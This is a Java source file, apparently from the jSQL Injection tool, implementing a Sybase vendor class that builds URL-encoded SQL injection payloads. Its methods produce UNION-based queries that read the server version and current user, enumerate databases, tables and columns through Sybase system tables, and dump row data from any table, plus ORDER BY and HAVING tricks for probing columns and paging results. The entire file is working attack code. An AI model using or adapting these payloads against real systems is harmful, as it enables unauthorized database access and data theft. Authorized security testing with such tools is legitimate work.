package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.QTE_SQL;
import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.util.StringUtil;

public class SybaseVendor extends AbstractVendorDefault {

    @Override
    public String getSqlInfos() {
        return
            "select+" +
                "@@version%2B'"+ SEPARATOR_SQL +"'%2Bdb_name()%2B'"+ SEPARATOR_SQL +"'%2Buser_name()" +
                "%2B'"+ TRAIL_SQL +"'r"
        ;
    }

    @Override
    public String getSqlDatabases() {
        return
            "select+rr%2b'"+ TRAIL_SQL +"'r+from+(select+'"+ SEPARATOR_SQL +"'%2bt.name%2b'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct++name+from+master..sysdatabases)t,(select+distinct+name+from+master..sysdatabases)t1+" +
            "where+t.name>=t1.name+" +
            "group+by+t.name{limit})a";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "select+rr%2b'"+ TRAIL_SQL +"'r+from+(select+'"+ SEPARATOR_SQL +"'%2bt.name%2b'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t,(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t1+" +
            "where+t.name>=t1.name+" +
            "group+by+t.name{limit})a";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+rr%2b'"+ TRAIL_SQL +"'r+from+(select+'"+ SEPARATOR_SQL +"'%2bt.name%2b'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t,(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t1+" +
            "where+t.name>=t1.name+" +
            "group+by+t.name{limit})a";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "{%}");
        
        formatListColumn = formatListColumn.replace("{%}", "%2b'')))%2b'%7f'%2brtrim(ltrim(convert(varchar,");
        
        formatListColumn = "rtrim(ltrim(convert(varchar," + formatListColumn + "%2b'')))";

        return
            "select+rr%2b'"+ TRAIL_SQL +"'r+from+(select+'"+ SEPARATOR_SQL +"'%2bt.s%2b'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+t.s{limit})a";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return "select'SQLi'%2bsubstring(r," + startPosition + ",65536)from(" + sqlQuery + ")x";
    }

    @Override
    public String getSqlCapacity(String[] indexes) {
        return
            MediatorModel.model().getIndexesInUrl().replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "(select'SQLi$1'%2breplicate('%23',1024)%2b'iLQS')"
            );
    }

    @Override
    public String getSqlIndices(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select+convert(varchar,(1337"+ i +"7330%2b1))a";
        }
        return "+union+select" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "from(" + replaceTag + ")b+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
}